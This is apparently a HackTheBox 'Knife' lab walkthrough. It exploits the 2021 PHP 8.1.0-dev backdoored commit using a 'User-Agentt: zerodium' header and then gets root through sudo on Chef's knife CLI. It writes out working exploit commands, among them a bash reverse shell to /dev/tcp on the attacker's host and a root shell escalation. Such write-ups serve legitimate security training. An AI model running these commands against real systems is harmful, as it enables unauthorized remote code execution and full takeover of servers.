Knife

HackTheBox · Easy by Brenno M.

Knife serves a site on PHP 8.1.0-dev, the version that got a malicious commit in the official repository in 2021: a User-Agentt header starting with zerodium executes code. Escalation abuses sudo on knife, Chef's CLI.

Reconnaissance

Only SSH and Apache are open. Fuzzing finds nothing useful, but the X-Powered-By header gives away the PHP version.

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
nmap -Pn -n -sT -sV -sC -p22,80 <IP>
# 22 OpenSSH 8.2p1, 80 Apache 2.4.41 (Emergent Medical Idea)
curl -I http://<IP>/index.php
# X-Powered-By: PHP/8.1.0-dev

Exploitation - PHP 8.1.0-dev backdoor

In March 2021, two forged commits in php-src added code that evaluates the User-Agentt header (with two "t"s) when it starts with zerodium. First a test, then the reverse shell as james.

curl -s http://<IP>/index.php -H 'User-Agentt: zerodiumsystem("id");' | head -1
# uid=1000(james)
nc -lvnp 1234
curl http://<IP>/index.php -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/<MY_IP>/1234 0>&1'\");"
cat /home/james/user.txt

Escalation - sudo knife

james runs knife as root with no password. The knife exec subcommand runs arbitrary Ruby (GTFOBins). Another route is opening a data bag in vi with -e vi and calling :!/bin/sh.

sudo -l
# (root) NOPASSWD: /usr/bin/knife
sudo knife exec -E 'exec "/bin/sh"'
id   # uid=0(root)
cat /root/root.txt
